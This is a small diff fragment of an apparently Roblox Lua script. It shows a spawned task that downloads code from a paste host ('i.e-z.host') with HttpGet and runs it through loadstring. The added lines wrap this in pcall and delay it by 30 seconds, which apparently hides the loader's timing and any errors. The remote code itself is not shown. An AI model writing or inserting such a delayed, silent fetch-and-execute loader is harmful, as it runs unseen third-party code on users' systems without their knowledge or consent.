@@ -152,7 +152,10 @@ end)
 repeat task.wait() until Solved.value
 --]]
 task.spawn(function()
+pcall(function()
+task.wait(30)
 	loadstring(game:HttpGet("https://i.e-z.host/p/raw/x8b4gnq9d5"))()
+end)
 end)
 leaf = true
 local maker =
